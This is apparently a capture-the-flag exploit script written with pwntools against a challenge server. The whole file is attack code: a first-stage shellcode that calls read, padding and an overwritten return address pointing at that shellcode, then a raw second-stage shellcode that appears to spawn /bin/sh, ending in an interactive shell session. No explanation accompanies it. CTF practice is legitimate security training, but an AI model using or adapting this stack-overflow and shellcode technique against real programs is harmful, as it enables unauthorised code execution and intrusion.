from pwn import *

r = remote("ctf.adl.tw", 11003)
# r = remote("127.0.0.1", 8887)

message = 0x601060

sc = asm("""
push r11
pop rdx
push rax
pop rdi
mov rsi, 0x601070
nop
nop
syscall
""", arch = "amd64")

r.recvuntil("?\n")
r.sendline("a")

r.recvuntil("?\n")
payload = sc + "a" * 0x8 + p64(message)
r.sendline(payload)

sc2 = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
r.sendline(sc2) 

r.interactive()
